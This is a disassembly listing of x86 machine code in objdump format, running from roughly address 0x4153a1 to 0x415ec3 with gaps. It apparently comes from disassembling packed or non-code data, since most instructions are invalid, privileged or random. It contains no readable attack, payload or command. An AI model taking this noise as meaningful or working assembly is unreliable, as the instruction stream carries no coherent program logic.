  4153a1:	outs   dx,DWORD PTR ds:[esi]
  4153a2:	(bad)  
  4153a3:	fcom   QWORD PTR [eax-0x31]
  4153a6:	or     ecx,ebp
  4153a8:	int3   
  4153a9:	jl     0x41537c
  4153ab:	mov    ch,0x9b
  4153ad:	stos   BYTE PTR es:[edi],al
  4153ae:	std    
  4153af:	fs pop edi
  4153b1:	mov    bh,0x55
  4153b3:	mov    dl,0xbb
  4153b5:	es cmc 
  4153b7:	lahf   
  4153b8:	xchg   ebx,eax
  4153b9:	and    BYTE PTR [ebx+0xe],0x8f
  4153bd:	lock mov bh,0xac
  4153c0:	xchg   edx,eax
  4153c1:	push   edi
	...
  415432:	add    BYTE PTR [eax],al
  415434:	pop    ebx
  415435:	jae    0x415479
  415437:	or     eax,0x775f3d6a
  41543c:	leave  
  41543d:	bnd jl 0x4153de
  415440:	mov    esi,0x64340f42
  415445:	jmp    0x137544a
  41544a:	add    BYTE PTR [eax],al
  41544c:	sub    eax,0xa3e113ef
  415451:	xchg   DWORD PTR [ebp+0x4ac20083],edi
  415457:	retf   
  415458:	push   DWORD PTR [edi-0x6]
  41545b:	or     eax,0xf420e12c
  415460:	mov    edi,0x1ea6e662
  415465:	mov    BYTE PTR [eax+0x441132f6],bh
  41546b:	inc    esp
  41546c:	inc    eax
  41546d:	aaa    
  41546e:	and    edi,DWORD PTR [esi]
  415470:	out    0x64,eax
  415472:	push   0xffffffad
  415474:	fistp  WORD PTR [ecx]
  415476:	sub    dh,cl
  415478:	mov    eax,ds:0x79615466
  41547d:	scas   eax,DWORD PTR es:[edi]
  41547e:	sub    al,0xed
  415480:	push   esi
  415481:	in     eax,0xfa
  415483:	stos   BYTE PTR es:[edi],al
  415484:	pushf  
  415485:	dec    ebx
  415486:	shl    DWORD PTR [ebx],1
  415488:	and    bl,dh
  41548a:	sub    eax,eax
  41548c:	jb     0x415485
  41548e:	pop    ebx
  41548f:	and    eax,0x1b34ea78
  415494:	jle    0x415480
  415496:	xchg   edi,eax
  415497:	or     DWORD PTR [esp+ebp*1+0x54fa7a91],esp
  41549e:	mov    DWORD PTR [edx],esp
  4154a0:	clc    
  4154a1:	ds adc al,0x36
  4154a4:	rol    esp,cl
  4154a6:	xchg   esi,eax
  4154a7:	dec    ecx
  4154a8:	out    0x54,eax
  4154aa:	xor    ch,ch
  4154ac:	repnz and al,0x95
  4154af:	lods   al,BYTE PTR ds:[esi]
  4154b0:	mov    edi,DWORD PTR [edi+0x68601c6b]
  4154b6:	out    dx,eax
  4154b7:	ds popa 
  4154b9:	retf   0x4b18
  4154bc:	sub    BYTE PTR [esi],bh
  4154be:	fst    st(6)
  4154c0:	push   ebp
  4154c1:	in     al,dx
  4154c2:	fstp   QWORD PTR [edi]
  4154c4:	xor    bh,BYTE PTR [ecx-0x3c]
  4154c7:	push   0xf055bcfa
  4154cc:	inc    ebp
  4154cd:	into   
  4154ce:	aad    0xc
  4154d0:	aas    
  4154d1:	imul   esi,edx,0x72
  4154d4:	xchg   ebp,eax
  4154d5:	into   
  4154d6:	aaa    
  4154d7:	ins    DWORD PTR es:[edi],dx
  4154d8:	mov    bl,0x5a
  4154da:	or     DWORD PTR [ebp-0x79],esi
  4154dd:	xor    al,0xbc
  4154df:	stos   BYTE PTR es:[edi],al
  4154e0:	jmp    0x7007eec3
  4154e5:	bswap  edx
  4154e7:	pop    edi
  4154e8:	ret    0x9e9a
  4154eb:	xchg   esp,eax
  4154ec:	pop    ebp
  4154ed:	sbb    ah,cl
  4154ef:	xchg   ebp,eax
  4154f0:	rcl    edi,0x84
  4154f3:	les    ebx,FWORD PTR [esi]
  4154f5:	mov    dl,0x3d
  4154f7:	cmp    al,BYTE PTR ds:0x1d6f81f3
  4154fd:	shl    dl,1
  4154ff:	iret   
  415500:	inc    edi
  415501:	pop    ebp
  415502:	push   edx
  415503:	mov    al,ds:0x33a2dc71
  415508:	mov    eax,ds:0x29df244b
  41550d:	cmp    eax,0x3e40466f
  415512:	repnz mov bh,0x52
  415515:	sub    BYTE PTR [edx+0x486b8561],ah
  41551b:	mov    ecx,0xe4c4b330
  415520:	retf   0xd479
  415523:	mov    ss,ebx
  415525:	js     0x4154f8
  415527:	loop   0x415571
  415529:	sub    eax,0xf9a17738
  41552e:	push   edx
  41552f:	add    WORD PTR [eax+edi*4+0xc3a0177],si
  415537:	push   edi
  415538:	dec    ecx
  415539:	stos   BYTE PTR es:[edi],al
  41553a:	push   esp
  41553b:	jmp    0x41559c
  41553d:	pop    eax
  41553e:	mov    dh,0x1
  415540:	aam    0xd6
	...
  4155b2:	add    BYTE PTR [eax],al
  4155b4:	jg     0x415614
  4155b6:	cmc    
  4155b7:	ins    DWORD PTR es:[edi],dx
  4155b8:	cmc    
  4155b9:	out    dx,eax
  4155ba:	call   FWORD PTR [esi-0x5a]
  4155bd:	sub    BYTE PTR [esi+0x31],al
  4155c0:	jae    0x415550
  4155c2:	nop
  4155c3:	(bad)  
  4155c4:	pop    edx
  4155c5:	jmp    0x0:0xf60000
  4155cc:	enter  0x91b7,0xa8
  4155d0:	(bad)  
  4155d1:	stc    
  4155d2:	les    ebp,FWORD PTR [esp+eiz*8]
  4155d5:	xchg   edi,eax
  4155d6:	lds    ecx,FWORD PTR ds:0x81d71a7
  4155dc:	js     0x4155c2
  4155de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4155df:	mov    fs,WORD PTR ds:0xe4bcb27e
  4155e5:	pop    edx
  4155e6:	pop    edi
  4155e7:	cmp    eax,0x31b4bb1
  4155ec:	int3   
  4155ed:	xor    ah,ah
  4155ef:	fstp   TBYTE PTR [ebp+0x2f3c911]
  4155f5:	or     BYTE PTR [edx],bh
  4155f7:	jp     0x415595
  4155f9:	lock lahf 
  4155fb:	test   DWORD PTR [edx+ebp*1+0x2f],ecx
  4155ff:	mov    ebp,0xb2dde07e
  415604:	je     0x415642
  415606:	loop   0x4155a6
  415608:	mov    cl,0x99
  41560a:	and    al,0xf4
  41560c:	add    BYTE PTR [edi+ebp*4-0x53],dh
  415610:	mov    bh,0xab
  415612:	fdiv   QWORD PTR [esp+ebp*2+0x5e5651c1]
  415619:	inc    ebx
  41561a:	or     eax,0xffffff8c
  41561d:	pop    esp
  41561e:	xchg   ecx,eax
  41561f:	add    eax,0xf667e36c
  415624:	sub    BYTE PTR [eax+0x4e],bh
  415627:	pop    edi
  415628:	cdq    
  415629:	inc    esi
  41562a:	lock mov WORD PTR [eax+edx*2-0x3b1ecbcc],?
  415632:	mov    ds:0x1155d7f9,al
  415637:	mov    ds,WORD PTR [ebx-0xe]
  41563a:	popf   
  41563b:	jg     0x415677
  41563d:	in     eax,0x97
  41563f:	mov    ds:0x28c71490,eax
  415644:	push   esp
  415645:	sub    eax,0x82e82ca
  41564a:	push   ecx
  41564b:	inc    ebx
  41564c:	sbb    cl,BYTE PTR [ebx-0x2e]
  41564f:	pop    ss
  415650:	cs into 
  415652:	das    
  415653:	stc    
  415654:	test   al,dh
  415656:	mov    eax,0x866a632e
  41565b:	test   BYTE PTR [ebp+esi*4+0x44],bl
  41565f:	inc    esi
  415660:	pop    ebx
  415661:	and    al,BYTE PTR [edi+0x46633f8]
  415667:	imul   ecx,DWORD PTR [eax+0x1a035f40],0xa123c88b
  415671:	in     eax,0xb0
  415673:	test   eax,0x371e41e4
  415678:	add    cl,BYTE PTR [eax+0x42]
  41567b:	or     ch,dl
  41567d:	mov    ecx,0x9ce4dfaa
  415682:	xor    ch,BYTE PTR [esi+0x2495f39e]
  415688:	scas   eax,DWORD PTR es:[edi]
  415689:	fdivr  DWORD PTR [eax-0x7e]
  41568c:	test   BYTE PTR [ecx-0x2b9841cd],ah
  415692:	fs ret 
  415694:	pop    ds
  415695:	sub    DWORD PTR [edx-0x527ddacb],edx
  41569b:	shl    BYTE PTR [ecx+0x9],1
  41569e:	scas   al,BYTE PTR es:[edi]
  41569f:	cmc    
  4156a0:	popf   
  4156a1:	test   ch,ch
  4156a3:	adc    eax,DWORD PTR [edi-0x79065d24]
  4156a9:	lock jno 0x415705
  4156ac:	adc    al,0xcc
  4156ae:	mov    ds,WORD PTR [ebp+0x1d1a7114]
  4156b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4156b5:	jno    0x415736
  4156b7:	xchg   ebp,eax
  4156b8:	ret    0x1e06
  4156bb:	fisub  DWORD PTR [ecx+eiz*1-0x38db98aa]
	...
  415732:	add    BYTE PTR [eax],al
  415734:	jle    0x415765
  415736:	add    DWORD PTR [ebp+0x51],ebp
  415739:	outs   dx,DWORD PTR ds:[esi]
  41573a:	jle    0x41577b
  41573c:	dec    esp
  41573d:	xchg   esp,eax
  41573e:	call   0xf08c08d3
  415743:	mov    esp,0xeb50
  415748:	test   BYTE PTR [eax],0x0
  41574b:	add    BYTE PTR [edi-0x29],al
  41574e:	(bad)  
  41574f:	not    DWORD PTR [eax+esi*4+0x5d]
  415753:	pop    ecx
  415754:	mov    cs,eax
  415756:	inc    esi
  415757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415758:	inc    ecx
  415759:	pavgb  mm2,QWORD PTR [ecx]
  41575c:	sahf   
  41575d:	loopne 0x4157d2
  41575f:	sbb    BYTE PTR [esi+0x65ca2cd4],dh
  415765:	lea    edi,[edx+esi*1]
  415768:	jecxz  0x4156fe
  41576a:	pop    edi
  41576b:	shl    BYTE PTR [ebx-0x4a599144],cl
  415771:	pop    ds
  415772:	adc    eax,0xd66c7fc2
  415777:	mov    dh,0xea
  415779:	pushf  
  41577a:	retf   0xe47
  41577d:	ficom  WORD PTR [esi-0x616b205c]
  415783:	test   al,0x0
  415785:	lds    ebp,FWORD PTR [esi]
  415787:	icebp  
  415788:	mov    dh,0x31
  41578a:	push   eax
  41578b:	shr    ebx,0x42
  41578e:	ins    BYTE PTR es:[edi],dx
  41578f:	dec    edx
  415790:	xchg   esp,eax
  415791:	push   cs
  415792:	adc    al,0x54
  415794:	fnsave [edx+0x182f3bcf]
  41579a:	sbb    DWORD PTR [esp+ebp*1+0x70a8edf9],ebx
  4157a1:	jne    0x41577c
  4157a3:	mov    ah,0xba
  4157a5:	adc    al,BYTE PTR [esp+ebp*4+0x3bcdd414]
  4157ac:	lds    ebx,FWORD PTR [eax+0x2]
  4157af:	pop    ss
  4157b0:	in     eax,dx
  4157b1:	pop    ss
  4157b2:	stos   DWORD PTR es:[edi],eax
  4157b3:	scas   al,BYTE PTR es:[edi]
  4157b4:	pop    es
  4157b5:	xchg   edx,eax
  4157b6:	cmp    BYTE PTR [ebx-0xf873635],bl
  4157bc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4157bd:	xor    dh,BYTE PTR [edx-0x5b]
  4157c0:	pop    es
  4157c1:	push   ecx
  4157c2:	mov    ecx,0xf7c3b4eb
  4157c7:	mov    ebx,0x6d974a7e
  4157cc:	and    DWORD PTR [edi+ebx*4-0x3e],esi
  4157d0:	or     eax,0xfcba9bda
  4157d5:	mov    esi,0x88bad652
  4157da:	sub    al,BYTE PTR [ecx]
  4157dc:	push   ds
  4157dd:	hlt    
  4157de:	jmp    0x36ba:0xaa5216dd
  4157e5:	add    eax,0x4eebd552
  4157ea:	inc    esi
  4157eb:	repz sar BYTE PTR [ebp+0x1e],0x25
  4157f0:	fs push ebx
  4157f2:	mov    al,0xa6
  4157f4:	and    eax,DWORD PTR ds:0x47ce0bff
  4157fa:	and    ebp,DWORD PTR [edi-0x11]
  4157fd:	out    dx,eax
  4157fe:	mov    DWORD PTR [ebx],eax
  415800:	jno    0x41585c
  415802:	push   edi
  415803:	lea    ebx,[edi+edx*8-0x6a79592e]
  41580a:	push   0xebad5b5
  41580f:	scas   eax,DWORD PTR es:[edi]
  415810:	ins    DWORD PTR es:[edi],dx
  415811:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415812:	int3   
  415813:	or     eax,DWORD PTR [ebx+ebx*8+0x38]
  415817:	in     eax,dx
  415818:	xchg   ebp,eax
  415819:	mov    al,0x39
  41581b:	mov    ch,0x93
  41581d:	inc    ebx
  41581e:	push   0xb16039d1
  415823:	mov    cl,BYTE PTR [esi]
  415825:	imul   esi,DWORD PTR [ebx],0x78
  415828:	jp     0x415879
  41582a:	mov    WORD PTR [eax-0x43d93aae],es
  415830:	or     BYTE PTR [edx-0x26],0x61
  415834:	ins    BYTE PTR es:[edi],dx
  415835:	retf   
  415836:	pop    ebx
  415837:	push   0x5d7a435d
  41583c:	mov    cl,0x6f
  41583e:	cdq    
  41583f:	cdq    
  415840:	jmp    0x415915
	...
  4158b1:	add    BYTE PTR [eax],al
  4158b3:	add    BYTE PTR [ebx],cl
  4158b5:	jle    0x415889
  4158b7:	and    esi,edi
  4158b9:	scas   eax,DWORD PTR es:[edi]
  4158ba:	sti    
  4158bb:	jle    0x41583e
  4158bd:	inc    eax
  4158be:	sbb    eax,0xc34ec6fe
  4158c3:	cmp    BYTE PTR [esi-0x14],al
  4158c6:	add    BYTE PTR [eax],al
  4158c8:	test   BYTE PTR [eax],0x0
  4158cb:	add    BYTE PTR [ebx+0x445a99d8],ah
  4158d1:	or     bh,dh
  4158d3:	addr16 push cs
  4158d5:	dec    edi
  4158d6:	imul   eax,DWORD PTR [ecx+edi*8+0x739d2d1f],0x2296b021
  4158e1:	mov    dl,0x99
  4158e3:	inc    ebp
  4158e4:	shl    BYTE PTR [edi],cl
  4158e6:	and    DWORD PTR [ecx+0x4d4acdbe],esp
  4158ec:	sbb    ecx,DWORD PTR [esi]
  4158ee:	pop    es
  4158ef:	enter  0xc96f,0x63
  4158f3:	(bad)  
  4158f4:	jmp    0x415926
  4158f6:	mul    DWORD PTR [ebp-0x47]
  4158f9:	repz lock dec edx
  4158fc:	mov    bh,0x6d
  4158fe:	or     al,0xc8
  415900:	xor    esi,DWORD PTR [ebp-0x46]
  415903:	add    eax,DWORD PTR [ecx-0x52]
  415906:	or     al,0xee
  415908:	push   eax
  415909:	push   edx
  41590a:	sahf   
  41590b:	adc    al,0xa
  41590d:	xchg   ebx,eax
  41590e:	leave  
  41590f:	sbb    eax,0x7fa7f22e
  415914:	pop    esp
  415915:	cwde   
  415916:	mov    bl,0x9c
  415918:	inc    esp
  415919:	loopne 0x415915
  41591b:	fidivr DWORD PTR [edi]
  41591d:	xchg   ebx,eax
  41591e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41591f:	out    dx,eax
  415920:	xchg   ebx,eax
  415921:	in     al,0xad
  415923:	aas    
  415924:	(bad)  
  415925:	outs   dx,DWORD PTR ds:[esi]
  415926:	add    al,bh
  415928:	push   ss
  415929:	les    esi,FWORD PTR [esi]
  41592b:	icebp  
  41592c:	(bad)  
  41592d:	popf   
  41592e:	sub    BYTE PTR [ebx],0x8e
  415931:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415932:	adc    DWORD PTR [eax-0x43c68ac3],eax
  415938:	or     ch,BYTE PTR [ebx+0xdba4b2d]
  41593e:	inc    esp
  41593f:	int3   
  415940:	cmp    al,0xd6
  415942:	pusha  
  415943:	es neg cl
  415946:	lock les esp,FWORD PTR [ebp+0x3f]
  41594a:	clc    
  41594b:	add    al,0x36
  41594d:	shr    BYTE PTR [ecx+edx*8-0x38],cl
  415951:	push   ecx
  415952:	in     al,dx
  415953:	hlt    
  415954:	push   ebx
  415955:	call   DWORD PTR [edx]
  415957:	jl     0x4159b0
  415959:	pop    eax
  41595a:	shl    ah,0x4a
  41595d:	popf   
  41595e:	fist   WORD PTR [eax+0x4ef12047]
  415964:	fwait
  415965:	data16 cs cld 
  415968:	inc    eax
  415969:	dec    edi
  41596a:	sub    eax,0x8ca2591c
  41596f:	jno    0x41594f
  415971:	jo     0x4159e1
  415973:	or     edi,esi
  415975:	and    BYTE PTR [edi+0x25a643a5],dl
  41597b:	cwde   
  41597c:	shr    DWORD PTR [eax],cl
  41597e:	or     dl,ch
  415980:	mov    cl,0x30
  415982:	adc    ebx,DWORD PTR [ebp+eax*2+0x10]
  415986:	loope  0x415912
  415988:	add    DWORD PTR fs:[edi],0xffffffda
  41598c:	push   esp
  41598d:	mov    ebx,0x3ef16455
  415992:	jecxz  0x41599e
  415994:	cmp    dl,BYTE PTR [eax+eiz*1]
  415997:	dec    ecx
  415998:	in     eax,dx
  415999:	add    BYTE PTR [ebx-0x52],cl
  41599c:	loop   0x4159f2
  41599e:	mov    WORD PTR [ebp-0x25382181],cs
  4159a4:	sub    al,0x25
  4159a6:	dec    esi
  4159a7:	dec    ebx
  4159a8:	sti    
  4159a9:	pop    edi
  4159aa:	mov    bl,0x2a
  4159ac:	js     0x415974
  4159ae:	mov    DWORD PTR [edi+esi*1+0x29dc5f4e],edi
  4159b5:	jmp    DWORD PTR [edx+0x16]
  4159b8:	inc    esp
  4159b9:	and    dl,al
  4159bb:	jecxz  0x415a27
  4159bd:	and    ebp,DWORD PTR [esi+ebx*2+0x6dd8]
	...
  415a34:	lahf   
  415a35:	fnstcw WORD PTR [esi]
  415a37:	ss jle 0x415a31
  415a3a:	lahf   
  415a3b:	stc    
  415a3c:	inc    ecx
  415a3d:	jb     0x415a8e
  415a3f:	lahf   
  415a40:	adc    DWORD PTR [eax-0x12c3f30f],esi
  415a46:	add    BYTE PTR [eax],al
  415a48:	test   BYTE PTR [eax],0x0
  415a4b:	add    ch,bh
  415a4d:	jb     0x415a44
  415a4f:	sar    DWORD PTR [ebx-0x66],1
  415a52:	aaa    
  415a53:	xor    eax,0x595590c2
  415a58:	pop    ebx
  415a59:	pop    eax
  415a5a:	lods   al,BYTE PTR ds:[esi]
  415a5b:	push   esi
  415a5c:	xchg   edx,eax
  415a5d:	je     0x415a11
  415a5f:	ds mov esi,0x52952c50
  415a65:	mov    ebp,esp
  415a67:	mov    BYTE PTR [ecx-0x3a],dh
  415a6a:	adc    bl,bh
  415a6c:	push   ds
  415a6d:	test   ah,bh
  415a6f:	call   0x6c5b:0x27ea8096
  415a76:	and    al,0x5d
  415a78:	sbb    al,0x90
  415a7a:	inc    ecx
  415a7b:	sub    eax,0x59eb5bdb
  415a80:	push   es
  415a81:	sbb    ah,BYTE PTR [edi+esi*4]
  415a84:	loop   0x415a54
  415a86:	pop    edi
  415a87:	jmp    0xe38d:0x9bc9e19f
  415a8e:	sbb    al,BYTE PTR [esi]
  415a90:	push   0x6eefacbe
  415a95:	(bad)  
  415a96:	cwde   
  415a97:	mov    ecx,0x9c4491be
  415a9c:	lods   eax,DWORD PTR ds:[esi]
  415a9d:	dec    edi
  415a9e:	xor    DWORD PTR [eax+0x7da37ee9],esi
  415aa4:	icebp  
  415aa5:	clc    
  415aa6:	aam    0xa0
  415aa8:	mov    edx,0xf5bf0f87
  415aad:	xor    ebp,DWORD PTR [ebp-0x2075cf10]
  415ab3:	push   ds
  415ab4:	push   edi
  415ab5:	mov    eax,ds:0x1d5b64f8
  415aba:	cwde   
  415abb:	mov    ecx,0xcb7cb8f5
  415ac0:	mov    esi,0xa283e36c
  415ac5:	test   BYTE PTR [edx+0x50],dh
  415ac8:	(bad)  
  415aca:	dec    ebx
  415acb:	mov    DWORD PTR [edi-0x9],esi
  415ace:	dec    esp
  415acf:	adc    BYTE PTR [esi],dl
  415ad1:	jmp    0xbfd947ca
  415ad6:	std    
  415ad7:	mov    cl,0x98
  415ad9:	aaa    
  415ada:	mov    dl,0x49
  415adc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415add:	retf   0x79fc
  415ae0:	cmp    BYTE PTR [edx-0x78a74f03],bh
  415ae6:	xchg   esp,eax
  415ae7:	int3   
  415ae8:	jae    0x415a81
  415aea:	daa    
  415aeb:	out    0x41,eax
  415aed:	aaa    
  415aee:	add    ah,BYTE PTR [edx+edx*2]
  415af1:	outs   dx,DWORD PTR ds:[esi]
  415af2:	shl    BYTE PTR [ecx-0x6c628123],cl
  415af8:	and    al,BYTE PTR [edx-0x23]
  415afb:	push   ss
  415afc:	jp     0x415ab1
  415afe:	or     DWORD PTR [eax+0x4559ddc9],eax
  415b04:	sub    BYTE PTR [esi],ch
  415b06:	shr    DWORD PTR [edi+edi*8+0x4fa8e207],cl
  415b0d:	sbb    al,0xc9
  415b0f:	call   0x43f5a863
  415b14:	jnp    0x415ad4
  415b16:	les    ebx,FWORD PTR [edi-0x17]
  415b19:	xor    BYTE PTR [edx-0x458ef6c6],al
  415b1f:	rcl    dh,1
  415b21:	push   es
  415b22:	sub    dh,BYTE PTR [ebx+0x30]
  415b25:	inc    esi
  415b26:	jmp    0x415b07
  415b28:	mov    al,0xe6
  415b2a:	or     al,0x4a
  415b2c:	xchg   esp,eax
  415b2d:	int    0xc5
  415b2f:	dec    esp
  415b30:	mov    ebp,0xe6873466
  415b35:	mov    al,ds:0xd2fe25
  415b3a:	inc    ecx
  415b3b:	inc    ebx
  415b3c:	addr16 dec ecx
  415b3e:	(bad)  
  415b3f:	xchg   esp,eax
  415b40:	inc    esp
  415b41:	add    BYTE PTR ds:[eax],al
	...
  415bb4:	xor    al,0x64
  415bb6:	push   ds
  415bb7:	jl     0x415c17
  415bb9:	jle    0x415c31
  415bbb:	ins    BYTE PTR es:[edi],dx
  415bbc:	pop    ds
  415bbd:	dec    DWORD PTR [edi+0x5a]
  415bc0:	dec    ecx
  415bc1:	sbb    edx,DWORD PTR [ebx+0xee320f]
  415bc7:	add    dh,dh
  415bc9:	add    BYTE PTR [eax],al
  415bcb:	add    BYTE PTR [edx+0x70],bh
  415bce:	xor    bl,dl
  415bd0:	inc    eax
  415bd1:	out    dx,eax
  415bd2:	mov    ebp,0x5761892d
  415bd7:	lods   al,BYTE PTR ds:[esi]
  415bd8:	mov    bh,0xac
  415bda:	sahf   
  415bdb:	pop    ss
  415bdc:	sub    esp,ebx
  415bde:	push   ds
  415bdf:	loop   0x415b8c
  415be1:	add    eax,0x1af51891
  415be6:	(bad)  
  415be7:	pushf  
  415be8:	push   esi
  415be9:	mov    ah,0x19
  415beb:	or     DWORD PTR [ebx+0x5a],edi
  415bee:	jne    0x415ba8
  415bf0:	hlt    
  415bf1:	xlat   BYTE PTR ds:[ebx]
  415bf2:	wbinvd 
  415bf4:	(bad)  
  415bf5:	jbe    0x415bbf
  415bf7:	js     0x415b93
  415bf9:	pop    esi
  415bfa:	jp     0x415b83
  415bfc:	hlt    
  415bfd:	inc    edi
  415bfe:	sbb    al,0xf0
  415c00:	push   es
  415c01:	fst    QWORD PTR [edi+eiz*1-0x45caba60]
  415c08:	add    bl,BYTE PTR [edi]
  415c0a:	dec    esp
  415c0b:	lods   eax,DWORD PTR ds:[esi]
  415c0c:	mov    cl,0x64
  415c0e:	adc    dl,BYTE PTR [eax-0x2de184f5]
  415c14:	sti    
  415c15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c16:	pop    edi
  415c17:	or     edx,ecx
  415c19:	lea    ebp,[edi]
  415c1b:	or     ebx,edi
  415c1d:	pop    edx
  415c1e:	jae    0x415bcc
  415c20:	dec    edx
  415c21:	shl    DWORD PTR [eax],0xe0
  415c24:	and    bl,BYTE PTR [ecx+0x5]
  415c27:	sahf   
  415c28:	enter  0x4249,0x51
  415c2c:	ret    
  415c2d:	ret    
  415c2e:	push   0x827699c7
  415c33:	nop
  415c34:	xchg   ecx,eax
  415c35:	dec    edi
  415c36:	pusha  
  415c37:	sub    ebx,DWORD PTR [eax-0x11]
  415c3a:	pop    ebp
  415c3b:	(bad)  
  415c3c:	fist   DWORD PTR [esi]
  415c3e:	push   esp
  415c3f:	inc    esi
  415c40:	stos   DWORD PTR es:[edi],eax
  415c41:	(bad)  
  415c42:	inc    bl
  415c44:	mov    esp,0xbc7768b0
  415c49:	imul   eax,ebp,0xffffffd4
  415c4c:	jnp    0x415c93
  415c4e:	sbb    esi,esi
  415c50:	jns    0x415c43
  415c52:	ins    DWORD PTR es:[edi],dx
  415c53:	jge    0x415be2
  415c55:	xchg   edi,eax
  415c56:	test   al,0xbb
  415c58:	addr16 jae 0x415c97
  415c5b:	add    cl,dl
  415c5d:	fs push 0xffffffa4
  415c60:	ret    0x525a
  415c63:	adc    ah,bl
  415c65:	jmp    0xb2e1:0x3e65fa36
  415c6c:	out    0x4d,eax
  415c6e:	mov    ebp,0xfa2f4e5f
  415c73:	dec    ebp
  415c74:	fld    TBYTE PTR [edx+0x1c68501f]
  415c7a:	daa    
  415c7b:	add    al,0xf
  415c7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c7e:	sbb    si,si
  415c81:	aam    0x5c
  415c83:	inc    esp
  415c84:	xor    cl,BYTE PTR [ecx-0x26d44863]
  415c8a:	sbb    al,0x88
  415c8c:	or     al,0x1e
  415c8e:	add    BYTE PTR [esi],0xfe
  415c91:	xchg   DWORD PTR [ecx-0xd9637d4],esi
  415c97:	test   al,0x78
  415c99:	xlat   BYTE PTR ds:[ebx]
  415c9a:	add    al,0xcd
  415c9c:	call   0xa7c7:0xb7d53c7
  415ca3:	shl    WORD PTR [ebx],1
  415ca6:	in     eax,0x30
  415ca8:	jns    0x415cbf
  415caa:	outs   dx,BYTE PTR ds:[esi]
  415cab:	pop    edi
  415cac:	cmp    DWORD PTR [ebp+0x2b],ebp
  415caf:	pushf  
  415cb0:	fcom   DWORD PTR [esi]
  415cb2:	mov    ebp,DWORD PTR [esi+0x385b8c8a]
  415cb8:	icebp  
  415cb9:	jge    0x415cb0
  415cbb:	mov    BYTE PTR [edi+0x2],ah
  415cbe:	xchg   BYTE PTR [ecx+0xb8a2],ch
	...
  415d34:	mov    bh,0x99
  415d36:	adc    dl,BYTE PTR [ecx-0x404864c2]
  415d3c:	pop    ebp
  415d3d:	jmp    0x9af3:0x62e8e72f
  415d44:	sub    bh,ch
  415d46:	add    BYTE PTR [eax],al
  415d48:	test   BYTE PTR [eax],0x0
  415d4b:	add    BYTE PTR [esi],ch
  415d4d:	shl    DWORD PTR [edi+0x1555b2ae],1
  415d53:	sub    esi,DWORD PTR [ebx+ebp*8]
  415d56:	popf   
  415d57:	xchg   DWORD PTR [edi+0x4e0e68b7],eax
  415d5d:	or     ebp,DWORD PTR [esi-0x245886d]
  415d63:	cmp    ebp,DWORD PTR [edi+0x3487519d]
  415d69:	(bad)  
  415d6a:	sar    BYTE PTR [ebx],1
  415d6c:	mov    ds:0x48a0f699,eax
  415d71:	push   0x52b5bd9c
  415d76:	dec    esp
  415d77:	mov    esp,DWORD PTR [ebp+0x58]
  415d7a:	push   ebp
  415d7b:	cmp    ch,bh
  415d7d:	inc    ebx
  415d7e:	cmovno eax,DWORD PTR [ebp+edx*4-0x66c660ed]
  415d86:	add    al,0xe0
  415d88:	add    esp,DWORD PTR [esi-0x4dcb6910]
  415d8e:	mov    DWORD PTR [eax+0x80fc6e],0x69ffd0f
  415d98:	repnz pop edx
  415d9a:	cli    
  415d9b:	dec    edi
  415d9c:	cwde   
  415d9d:	jo     0x415dfd
  415d9f:	inc    esi
  415da0:	pop    esp
  415da1:	add    eax,0xab97c9ce
  415da6:	repnz mov edi,0xa6c84a05
  415dac:	sub    DWORD PTR [edx],edx
  415dae:	pop    esi
  415daf:	mov    ds:0x7f6ed96a,al
  415db4:	fucomip st,st(5)
  415db6:	(bad)  
  415db7:	(bad)  
  415db8:	(bad)  
  415db9:	jecxz  0x415e0f
  415dbb:	adc    eax,0x81973921
  415dc0:	sub    esi,DWORD PTR [eax]
  415dc2:	dec    esi
  415dc3:	in     al,0xdb
  415dc5:	mov    ah,0x16
  415dc7:	adc    al,0x74
  415dc9:	shl    DWORD PTR [edx],cl
  415dcb:	inc    ecx
  415dcc:	ret    
  415dcd:	or     ecx,DWORD PTR [ebx+0x2bca6729]
  415dd3:	ficomp WORD PTR [ebx+0x5f]
  415dd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415dd7:	cmp    al,0x46
  415dd9:	push   cs
  415dda:	or     BYTE PTR [edx+ebx*2-0x56],ch
  415dde:	leave  
  415ddf:	or     ebx,DWORD PTR [ebp-0x70]
  415de2:	jo     0x415e5a
  415de4:	xchg   BYTE PTR [ecx],ch
  415de6:	inc    ebp
  415de7:	inc    ecx
  415de8:	push   0x794dbec9
  415ded:	nop
  415dee:	inc    edi
  415def:	test   DWORD PTR [ecx],esi
  415df1:	cmp    ebp,DWORD PTR [ecx+0x64]
  415df4:	pop    edi
  415df5:	in     al,dx
  415df6:	mov    dh,0x8c
  415df8:	sbb    eax,DWORD PTR [ecx+0x44601ab7]
  415dfe:	cmp    DWORD PTR [esi-0x4c1f4ae0],eax
  415e04:	sub    esi,ebx
  415e06:	pop    ebp
  415e07:	mov    dl,0x84
  415e09:	push   es
  415e0a:	cld    
  415e0b:	data16 mov cl,0x0
  415e0e:	dec    edx
  415e0f:	mov    ch,0x34
  415e11:	repnz pop ecx
  415e13:	stos   DWORD PTR es:[edi],eax
  415e14:	push   edx
  415e15:	xchg   esi,eax
  415e16:	mov    WORD PTR [eax+0x5c],es
  415e19:	cmp    al,0x5f
  415e1b:	sub    eax,0x2ab9db1b
  415e20:	jp     0x415e11
  415e22:	jmp    0xef9f:0xc57ab24b
  415e29:	clc    
  415e2a:	pop    ebx
  415e2b:	mov    ebp,DWORD PTR [eax+0x4]
  415e2e:	mov    ch,0xc8
  415e30:	retf   0xc616
  415e33:	mov    ebx,0x1a66cd90
  415e38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e39:	xor    eax,0xb458294d
  415e3e:	mov    ebp,0x5ced8b
	...
  415eb3:	add    BYTE PTR [edi],dh
  415eb5:	data16 xor al,0x9b
  415eb8:	jne    0x415e95
  415eba:	mov    edi,0xdeb84bee
  415ebf:	gs in  al,dx
  415ec1:	in     eax,0xd6
  415ec3:	gs push ds
